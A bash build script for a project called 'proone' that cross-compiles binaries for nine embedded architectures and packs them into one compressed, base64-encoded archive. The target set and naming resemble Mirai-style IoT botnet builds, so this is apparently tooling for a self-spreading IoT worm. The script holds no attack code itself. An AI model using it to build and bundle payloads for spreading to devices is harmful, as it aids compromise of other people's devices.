#!/bin/bash
ARCH_ARR=(
    "armv4t"
    "armv7"
    "i586"
    "m68k"
    "mips"
    "mpsl"
    "ppc"
    "sh4"
    "spc"
)
TOOLCHAIN_ARR=(
    "armv4t"
    "armv7"
    "i586"
    "m68k"
    "mips"
    "mpsl"
    "ppc"
    "sh4"
    "spc"
)
HOST_ARR=(
    "arm-buildroot-linux-uclibcgnueabi"
    "arm-buildroot-linux-uclibcgnueabi"
    "i586-buildroot-linux-uclibc"
    "m68k-buildroot-linux-uclibc"
    "mips-buildroot-linux-uclibc"
    "mipsel-buildroot-linux-uclibc"
    "powerpc-buildroot-linux-uclibc"
    "sh4-buildroot-linux-uclibc"
    "sparc-buildroot-linux-uclibc"
)
ARR_SIZE="${#ARCH_ARR[@]}"
if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] || [ $ARR_SIZE -ne "${#HOST_ARR[@]}" ]; then
    echo "Config error: arrays" >&2
    exit 2
fi

PROONE_PREFIX="builds"
PROONE_BIN="$PROONE_PREFIX/bin"
PROONE_TOOLS="$PROONE_PREFIX/tools"
export PROONE_BIN_PREFIX="$PROONE_BIN/proone"
PROONE_PACKER="$PROONE_TOOLS/proone-packer"
PROONE_UNPACKER="$PROONE_TOOLS/proone-unpacker"
PROONE_BIN_ARCHIVE="$PROONE_PREFIX/bin-archive.zz.base64"

rm -rf "$PROONE_PREFIX" && mkdir "$PROONE_PREFIX" "$PROONE_BIN" "$PROONE_TOOLS"
if [ $? -ne 0 ] ; then
    exit $?
fi

make distclean

# native build for tools
./configure &&  make -j$(nproc) && cp -a src/proone-packer "$PROONE_PACKER" && cp -a src/proone-unpacker "$PROONE_UNPACKER" && make distclean
if [ $? -ne 0 ]; then
    exit $?
fi

# cross-compile targets
for (( i = 0; i < ARR_SIZE; i += 1 )); do
    PROONE_HOST="${HOST_ARR[$i]}" PROONE_BIN_ARCH="${ARCH_ARR[$i]}" bash-xcomp-uclibc "${TOOLCHAIN_ARR[$i]}" "scripts/xcomp.sh"
    if [ $? -ne 0 ]; then
        exit $?
    fi
done

# pack
"$PROONE_PACKER" "$PROONE_BIN_PREFIX."* | pigz -z - | base64 > "$PROONE_BIN_ARCHIVE"
if [ $? -ne 0 ]; then
    exit $?
fi

# archive test


# size report
total_bin_size=$(cat "$PROONE_BIN_PREFIX."* | wc -c)
bin_archive_size=$(wc -c "$PROONE_BIN_ARCHIVE" | awk '{print $1;}')
echo "print(\"archive/bin = $bin_archive_size / $total_bin_size (\" + str($bin_archive_size / $total_bin_size * 100) + \"%)\")" | python3

exit 0
